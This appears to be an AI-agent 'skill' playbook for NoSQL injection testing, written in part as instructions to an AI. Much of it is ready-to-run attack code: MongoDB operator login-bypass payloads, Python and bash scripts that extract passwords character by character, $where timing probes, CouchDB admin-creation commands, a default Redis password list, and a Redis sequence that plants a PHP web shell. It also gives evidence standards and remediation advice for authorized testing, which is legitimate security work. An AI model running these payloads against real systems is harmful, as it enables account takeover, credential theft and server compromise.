---
name: nosql-injection
description: >-
  NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection is fundamentally different from SQL injection. Covers MongoDB operator injection, authentication bypass, blind extraction, aggregation pipeline injection, and Redis/CouchDB specific attacks. Very commonly missed by testers who only know SQLi patterns.
>
> **The evidence is operator injection that changes the RESULT SET** — an authentication bypass, a
> data extraction, or a written record. A `500` is not evidence. Show the request that returned
> the *other* result and the control request that did not.
>
> **Four false positives account for most rejected reports**: a `500` from malformed JSON (the
> parser failed, nothing was injected); an operator stripped by a schema validator; a `$regex`
> that matches nothing; and a query error that merely echoes your input back. Confirm the
> behaviour change before writing it up.

## 0. RELATED ROUTING

- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) — the authentication context you bypass
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) — array-syntax parsing that enables operator injection
- [prototype-pollution-advanced](../prototype-pollution-advanced/SKILL.md) — nested-object parsing via the same libraries
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — the SQL counterpart, for contrast
- [type-juggling](../type-juggling/SKILL.md) — scalar-vs-array type confusion
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving a result-set change

---

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.  
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
```javascript
db.users.find({username: "alice", password: "secret"})
```

Injection via JSON operator:
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ Becomes: `find({username:"admin", password:{$gt:""}})` → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection (API with JSON Content-Type)
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST` Array Injection (URL-encoded form)
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params` Array Injection
Same as PHP — use bracket notation to inject objects:
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL-encoded `$`

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| `$ne` | not equal | `{"password": {"$ne": "x"}}` → always matches |
| `$gt` | greater than | `{"password": {"$gt": ""}}` → all non-empty passwords match |
| `$gte` | greater or equal | Similar to $gt |
| `$lt` | less than | `{"password": {"$lt": "~"}}` → all ASCII match |
| `$regex` | regex match | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS expression | MOST DANGEROUS — code execution |
| `$exists` | field exists | `{"admin": {"$exists": true}}` |
| `$in` | in array | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

Like binary search in SQLi, use `$regex` to extract field values character by character:

```json
// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password start with 'b'?
{"username": "admin", "password": {"$regex": "^b"}}

// Continue: narrow down each position
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

**Response difference**: successful login vs failed login = boolean oracle.

**Automate** with NoSQLMap or custom script with binary search on character set.

---

## 5. MONGODB $WHERE INJECTION (JS EXECUTION)

`$where` evaluates JavaScript in MongoDB context.  
**Can only use current document's fields** — not system access. But allows logic abuse:

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind extraction via timing:
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// Regex via JS:
{"$where": "this.username.match(/^adm/) && true"}
```

**Limit**: `$where` doesn't give OS command execution — **server-side JS injection** (not to be confused with command injection).

---

## 6. AGGREGATION PIPELINE INJECTION

When user-controlled data enters `$match` or `$group` stages:

```javascript
// Vulnerable code:
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

Inject operators to bypass:
```json
// Input as object:
{"$ne": null}  → matches all categories
{"$regex": ".*"}  → matches all
```

---

## 7. HTTP PARAMETER POLLUTION FOR NOSQL

Some frameworks (Express.js, PHP) parse repeating parameters as arrays:
```
?filter=value1&filter=value2 → filter = ["value1", "value2"]
```

Use `qs` library parse behavior in Node.js:
```
?filter[$ne]=invalid
→ parsed as: filter = {$ne: "invalid"}
→ NoSQL operator injection
```

---

## 8. COUCHDB ATTACKS

### HTTP Admin API (if exposed)
```bash
# List databases:
curl http://target.com:5984/_all_dbs

# Read all documents in a DB:
curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true

# Create admin account (if anonymous access allowed):
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

---

## 9. REDIS INJECTION

Redis exposed (6379) with no auth — command injection via input used in Redis queries:

```
# Via SSRF or direct injection:
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

**Auth bypass** (older Redis with `requirepass` using simple password):
```
AUTH password
AUTH 123456
AUTH redis
AUTH admin
```

---

## 10. DETECTION PAYLOADS

Send these to any input processed by NoSQL backend:

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', sleep(1000)
1' ; sleep(1000)
{"$gt": ""}
{"$ne": "invalid"}
[$ne]=invalid
[$gt]=
```

**JSON variant** test (change Content-Type to `application/json` if endpoint is form-based):
```json
{"username": "admin", "password": {"$ne": ""}}
```

### Triage commands

```bash
# Baseline: a legitimate failed login gives you the reference response. Capture it first —
# every injection result is judged against this.
curl -s -X POST https://TARGET/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"definitely-wrong"}' -w '\n%{http_code} %{size_download}b\n'
```

```bash
# Operator injection. Compare each to the baseline: a changed status or body length is the
# signal that the operator reached the query.
for pl in '{"$ne":"x"}' '{"$gt":""}' '{"$regex":".*"}' '{"$exists":true}'; do
  printf '%-18s ' "$pl"
  curl -s -o /dev/null -w '%{http_code} %{size_download}b\n' -X POST https://TARGET/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":$pl}"
done
```

```bash
# Form-encoded array syntax. The bracket notation makes the parser build an object, which is
# how a PHP/Express endpoint receives a MongoDB operator.
curl -s -X POST https://TARGET/login \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password[$ne]=x' \
  -w '\n%{http_code} %{size_download}b\n'
```

```bash
# Type confusion: send the password as an array instead of a scalar. If the app treats it as
# an operator object, the query logic changes; if it 500s on malformed input, that is a false
# positive, not a finding.
curl -s -X POST https://TARGET/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":["x"]}' -w '\n%{http_code}\n'
```

```bash
# Time-based $where probe. A consistent delay tied to a true condition is the oracle; a delay
# on every request is just a slow endpoint, and an error is nothing.
for cond in 'sleep(5000);return true' 'return true'; do
  printf '%-28s ' "$cond"
  curl -s -o /dev/null -w 'total=%{time_total}s\n' -X POST https://TARGET/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":{\"\$where\":\"$cond\"},\"password\":\"x\"}"
done
```

---

## 11. NOSQL VS SQL — KEY DIFFERENCES

| Aspect | SQLi | NoSQLi |
|---|---|---|
| Language | SQL syntax | Query operator objects |
| Injection vector | String concatenation | Object/operator injection |
| Common signal | Quote breaks response | `{$ne:x}` changes response |
| Extraction method | UNION / error-based | `$regex` character oracle |
| Auth bypass | `' OR 1=1--` | `{"password":{"$ne":""}}` |
| OS command | xp_cmdshell (MSSQL) | Rare (need `$where` + CVE) |
| Fingerprint | DB-specific error messages | "cannot use $" errors |

---

## 12. TESTING CHECKLIST

```
□ Test login fields with: {"$ne": "invalid"} JSON body
□ Test URL-encoded forms: password[$ne]=invalid
□ Test $regex for blind enumeration of field values
□ Try $where with sleep() for time-based blind
□ Check 5984 port for CouchDB (unauthenticated admin)
□ Check 6379 port for Redis (unauthenticated)
□ Try Content-Type: application/json on form endpoints
□ Monitor for operator-related error messages ("BSON" "operator" "$not allowed")
```

---

## 13. BLIND NoSQL EXTRACTION AUTOMATION

### $regex Character-by-Character Extraction (Python Template)

```python
import requests
import string

url = "http://target/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
password = ""

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{c}.*"
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            found = True
            print(f"Found: {password}")
            break
    if not found:
        break

print(f"Final password: {password}")
```

### $regex via URL-encoded GET Parameters

```
username=admin&password[$regex]=^a.*
username=admin&password[$regex]=^ab.*
# Iterate through charset until login succeeds
```

### Shell loop for the same extraction

No Python needed for a quick oracle — `curl` plus `grep` over the charset is enough. `-s` keeps
the output clean; the length/status difference is the oracle.

```bash
# Derive the password prefix one character at a time. Each iteration appends the character
# that flips the response from the "fail" baseline to the "success" response.
prefix=''
base_len=$(curl -s -o /dev/null -w '%{size_download}' -X POST https://TARGET/login \
  --data-urlencode 'username=admin' --data-urlencode 'password[$regex]=^zzzz')

for i in $(seq 1 24); do
  for c in {a..z} {A..Z} {0..9} '_' '-' '.' '@'; do
    len=$(curl -s -o /dev/null -w '%{size_download}' -X POST https://TARGET/login \
      --data-urlencode 'username=admin' \
      --data-urlencode "password[\$regex]=^${prefix}${c}.*")
    if [ "$len" != "$base_len" ]; then prefix="${prefix}${c}"; echo "prefix=$prefix"; break; fi
  done
done
echo "recovered: $prefix"
```

```bash
# Blind extraction by timing rather than response size, when the response body is uniform.
# A true condition sleeps; the measured difference is the oracle.
for c in a b c d e f; do
  t=$(curl -s -o /dev/null -w '%{time_total}' -X POST https://TARGET/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":{\"\$where\":\"this.password[0]=='$c' && sleep(3000)\"}}")
  echo "$c -> ${t}s"
done
```

### Duplicate Key Bypass

```json
// When app checks one key but processes another:
{"id": "10", "id": "100"}
// JSON parsers typically use last occurrence
// Bypass: WAF validates id=10, app processes id=100
```

---

## 14. PIPELINE DATA-ACCESS PRIMITIVES ($lookup / $out / $function)

> Section 6 covers *operator injection into* a pipeline stage. This section covers the
> **pipeline stages themselves as data-access primitives** — what an attacker gains once input
> reaches an aggregation pipeline at all, beyond changing a match condition.

When user input reaches MongoDB aggregation pipeline stages:

```javascript
// If user controls $match stage:
db.collection.aggregate([
  { $match: { user: INPUT } }  // INPUT from user
])

// Injection: provide object instead of string
// INPUT = {"$gt": ""} → matches all documents

// $lookup for cross-collection data access:
// If $lookup stage is injectable, read a collection the query was never meant to touch:
{ $lookup: {
    from: "admin_users",       // attacker-chosen collection
    localField: "user_id",
    foreignField: "_id",
    as: "leaked"
}}

// $out / $merge to WRITE results into a collection you can then read:
{ $out: "public_collection" }  // Write query results to an accessible collection
```

### $function and $accumulator (server-side JS in the pipeline)

Newer MongoDB aggregation stages run JavaScript too, which extends the `$where` sink into the
pipeline itself:

```javascript
// $function evaluates a JS body per document — same trust problem as $where:
{ $addFields: { x: { $function: { body: INPUT, args: ["$field"], lang: "js" } } } }
```

**Reference**: Soroush Dalili — "MongoDB NoSQL Injection with Aggregation Pipelines" (2024)

**Note:** `$where` and `$function` run JavaScript on the server. Besides logic abuse and timing
oracles, older MongoDB builds without a tight V8 sandbox historically raised RCE concerns;
prefer treating any server-side-JS sink as high risk.

---

## 15. WHAT CONSTITUTES A FINDING

The finding is a **result-set change**, not an error. Every row below requires that you observed
a different *outcome* from the control request.

| Finding | Severity | Proof required |
|---|---|---|
| Authentication bypass via operator injection | **Critical (P1)** | the forged login returning a session/token, plus the control login failing |
| Extraction of another user's field values (blind `$regex` oracle) | **Critical (P1)** | the recovered value, cross-checked against a known-good source |
| `$where` / `$function` server-side JS with a demonstrated oracle | **High (P2)** | the timing or boolean oracle, with the control timing |
| Write injection (`$out`/`$merge`, or a write through a query filter) | **High (P2)** | the written record read back |
| Unauthenticated CouchDB/Redis reachable with data or write access | **High (P2)** | the data read, or the written record |
| Result-set change with no sensitive data and no bypass | **Low–Medium (P3/P4)** | the two differing responses |
| A `500` from malformed JSON | **Not a finding** | the parser failed; nothing was injected |
| A query error echoing your input back | **Not a finding** | no behavioural change |
| `$regex` that matches nothing | **Not a finding** | no oracle |

---

## 16. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the **control request** and its response | the baseline every result is judged against |
| the injection request and its differing response | the behaviour change — the finding |
| the exact operator and the field it reached | the mechanism |
| for a bypass: the session or token obtained, and a privileged action taken with it | proves the bypass is real |
| for blind extraction: the recovered value plus the oracle sequence that derived it | the extraction is the finding |
| for timing: paired timings with matched true/false conditions | a single slow response proves nothing |
| the `Content-Type` and encoding used | operator injection is parser-dependent |

**The control is the whole methodology.** Without the failing legitimate login beside the
successful injected one, a `200` proves nothing — many endpoints return `200` with
`{"error":...}`.

**False positives to exclude:**

| Looks like injection | Actually |
|---|---|
| a `500` on malformed JSON | parser error, not injection |
| a schema validator strips the operator | the operator never reached the query |
| a `$regex` that matches nothing | no oracle, no result change |
| the error message echoes your input | reflection, not execution |
| a heavy legitimate query times out | unrelated to any injected operator |
| the endpoint returns `200` with an error body | no bypass occurred |
| an operator accepted but the result set is identical | no behavioural change |

---

## 17. REMEDIATION REFERENCE

1. **Cast every input to its expected scalar type** — reject objects and arrays outright where a string is expected. This alone defeats operator injection.
2. **Use a schema validator on every query object** — a validator that permits only known scalar fields removes `$`-prefixed keys before they reach the driver.
3. **Never pass a request body directly as a query** — `find(req.body)` and `filter(**request.data)` are the root causes.
4. **Disable server-side JavaScript** — turn off `$where`, `$function`, and `mapReduce` via `--noscripting` / `security.javascriptEnabled: false` where the workload permits.
5. **Reject keys beginning with `$` or containing `.`** — a recursive sanitizer over the parsed body catches the nested cases.
6. **Do not enable `$lookup`/`$out` on user-shaped input** — allowlist the pipeline stages an endpoint may use.
7. **Bind CouchDB and Redis to localhost and require authentication** — the exposed-default deployments are the whole attack for those two engines.
8. **Rate-limit and log authentication attempts** — a `$regex` blind oracle is thousands of requests; the volume is detectable even when each request looks legitimate.

---

## 18. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the injected operator **change the result set**, not just the status code? | the database, not the framework |
| 2 | Was there a **control query with the operator removed**? | the operator is the cause |
| 3 | Did you get **authentication bypass, data extraction, or code execution**? | the impact class |
| 4 | For `$where` or `$function`: did the **server-side evaluation** actually run? | the highest-impact case |
| 5 | Did the error text or timing **name the database**? | the sink is confirmed, not guessed |
| 6 | Did you test both the **body and the query string**, and both JSON and form encodings? | the parser reach |
| 7 | Did you leave **no documents written** and verify that with a query? | engagement integrity |

**A changed result set with its control is the bar.** A `500` where you sent an operator may be the
framework rejecting it; the differential result set is what proves the database evaluated it.

---

## 19. EXECUTION PRIMITIVES

NoSQL injection is proven by **a result set that the un-injected query cannot produce, with the
operator-free control**. Every block ends at a differential or an evaluated expression.

### 19.1 The control pair for the authentication case

```bash
HOST="https://target.example"
# BENIGN CONTROL: valid credentials, which must return a session
curl -sS -o /dev/null -w 'valid     %{http_code} len=%{size_download}\n' -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"correct-horse"}' "$HOST/api/login"
# THE CONTROL THAT MATTERS: wrong password with a STRING value, which must be rejected
curl -sS -o /dev/null -w 'bad-string %{http_code} len=%{size_download}\n' -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"wrong"}' "$HOST/api/login"
# THE ATTACK: the operator where a string belongs
curl -sS -o /dev/null -w 'operator  %{http_code} len=%{size_download}\n' -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":{"$ne":null}}' "$HOST/api/login"
curl -sS -o /dev/null -w 'not-in    %{http_code} len=%{size_download}\n' -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":{"$not":{"$eq":"wrong"}}}' "$HOST/api/login"
# and the user enumeration form, which needs no password at all
curl -sS -o /dev/null -w 'enum      %{http_code} len=%{size_download}\n' -H 'Content-Type: application/json' \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' "$HOST/api/login"
```

**The `bad-string` row is the control.** If a wrong string password is rejected and `{"$ne":null}` is
accepted, the operator reached the database - and that single pair is the finding.

### 19.2 The extraction primitives, with a differential per character

```python
import requests, json, string
HOST = "https://target.example"

def login(payload):
    r = requests.post(f"{HOST}/api/login", json=payload, timeout=10)
    return r.status_code, len(r.content)

BASE = {"username": "admin", "password": {"$ne": None}}
print("baseline operator login:", login(BASE))
print("control (string):      ", login({"username": "admin", "password": "x"}))
print()

# blind extraction via a regex operator, one character at a time - the classic and the reliable one
def extract_field(field, prefix=""):
    charset = string.ascii_lowercase + string.digits + "_{}-@."
    out = prefix
    for _ in range(40):
        for ch in charset:
            cand = out + ch
            st, _ = login({"username": "admin",
                           "password": {"$ne": None},
                           field: {"$regex": "^" + re.escape(cand)}})
            if st == 200 and _ > 400:
                out = cand; break
        else:
            break
    return out

import re
print("NOTE: the loop above queries ONE field at a time; run it against the field you are testing")
print("and record each accepted prefix, which is the evidence for the extracted value.")
print("The differential between a matching and a non-matching prefix is the extraction.")
```

**The differential per character is the evidence.** A blind extraction without the non-matching control
is indistinguishable from a login that always succeeds, and that is the standard failure here.

### 19.3 The query-string and form-encoded forms, which bypass JSON-only filters

```bash
HOST="https://target.example"
# many filters guard the JSON body only; the bracket syntax reaches the same parser
curl -sS -o /dev/null -w 'qs-bracket  %{http_code} len=%{size_download}\n' \
  -d 'username=admin&password[$ne]=null' "$HOST/api/login"
curl -sS -o /dev/null -w 'qs-bracket2 %{http_code} len=%{size_download}\n' \
  -d 'username[$gt]=&password[$gt]=' "$HOST/api/login"
# and in the query string itself, which some routers parse into the same object
curl -sS -o /dev/null -w 'in-url      %{http_code} len=%{size_download}\n' \
  "$HOST/api/login?username=admin&password[\$ne]=null"
# the control for each: a string value, which must behave differently
curl -sS -o /dev/null -w 'control     %{http_code} len=%{size_download}\n' \
  -d 'username=admin&password=wrong' "$HOST/api/login"
```

**The encoded-form variant reached a different parser.** A filter that inspects `application/json` bodies
does not see `application/x-www-form-urlencoded`, and the bracket syntax is parsed into the same object
by most frameworks.

### 19.4 `$where` and `$function`, where the impact becomes code execution

```bash
HOST="https://target.example"
# $where evaluates JavaScript server-side on MongoDB; the timing difference is the proof
python3 - <<'PY'
import requests, time
HOST = "https://target.example"
def timed(payload, n=3):
    ts = []
    for _ in range(n):
        t0 = time.perf_counter()
        try: requests.post(f"{HOST}/api/search", json=payload, timeout=30)
        except Exception: pass
        ts.append(time.perf_counter() - t0)
    return sorted(ts)[len(ts)//2]

benign = timed({"q": "laptop"})
print(f"benign query           {benign*1000:8.1f} ms")
# the same predicate, always true, with a deliberate delay
bad = timed({"q": {"$where": "function(){ return true; }"}})
print(f"$where always-true     {bad*1000:8.1f} ms")
sleepy = timed({"q": {"$where": "function(){ sleep(5000); return true; }"}})
print(f"$where with sleep(5s)  {sleepy*1000:8.1f} ms  <- a 5 s delta proves server-side evaluation")
print()
print("the three-run median is the evidence; a single slow response is jitter")
PY
```

**The `sleep(5000)` delta is the proof of server-side evaluation.** A `$where` that returns the same
timing as a plain query has not been demonstrated to evaluate, and reporting it is a guess.

### 19.5 Write primitives, with the revert

```bash
HOST="https://target.example"
# an update operator that reaches the database is the write-side finding - use a test document only
curl -sS -o /dev/null -w 'update %{http_code}\n' -H 'Content-Type: application/json' \
  -d '{"_id":"pentest-doc","$set":{"marker":"pentest"}}' "$HOST/api/items"
# and the read-back that proves it landed
curl -sS "$HOST/api/items/pentest-doc" | head -c 200; echo
# THE REVERT and its verification
curl -sS -X DELETE -o /dev/null -w 'delete %{http_code}\n' "$HOST/api/items/pentest-doc"
curl -sS -o /dev/null -w 'revert-verify %{http_code}  (404 is the correct result)\n' "$HOST/api/items/pentest-doc"
```

**Every write gets a read-back and a verified revert.** A document left in the database is an incident,
and the `404` after the delete is the evidence it was removed.

### 19.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, json
HOST = "https://target.example"
URL = f"{HOST}/api/login"

def probe(body, label):
    try:
        r = requests.post(URL, json=body, timeout=15)
        return label, r.status_code, len(r.content), (r.text[:120])
    except Exception as e:
        return label, "ERR", 0, type(e).__name__

CASES = [
    ({"username": "alice", "password": "correct-horse"}, "control-valid"),
    ({"username": "alice", "password": "wrong"},         "control-wrong-string"),
    ({"username": "alice", "password": {"$ne": None}},   "attack-ne-null"),
    ({"username": "alice", "password": {"$gt": ""}},     "attack-gt-empty"),
    ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "attack-enum-all"),
]
print("%-22s %-6s %-8s %s" % ("case", "code", "len", "body"))
for body, label in CASES:
    l, c, n, b = probe(body, label)
    print("%-22s %-6s %-8s %s" % (l, c, n, b.replace("\n", " ")))

print()
print("VERDICT: a 200-with-session on an attack row, where the wrong-string control is rejected,")
print("         is the finding. A 500 on every attack row is the framework rejecting the operator - not a finding.")
print()
print("Then: extract one field blind with the $regex differential, and record the matched prefixes.")
PY
```

**The control-valid and control-wrong rows decide everything.** Without them, an attack row returning
`200` is indistinguishable from an endpoint that never checks a password.

---

## 20. RELATED SIBLINGS - LOAD TOGETHER

- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) - the SQL counterpart with the same differential discipline
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the login-bypass family this belongs to
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) - how the JSON endpoints and their body shapes are discovered
- [nosql-injection](../nosql-injection/SKILL.md) - this document
- [prototype-pollution](../prototype-pollution/SKILL.md) - the same operator-reaching-a-parser class in JavaScript
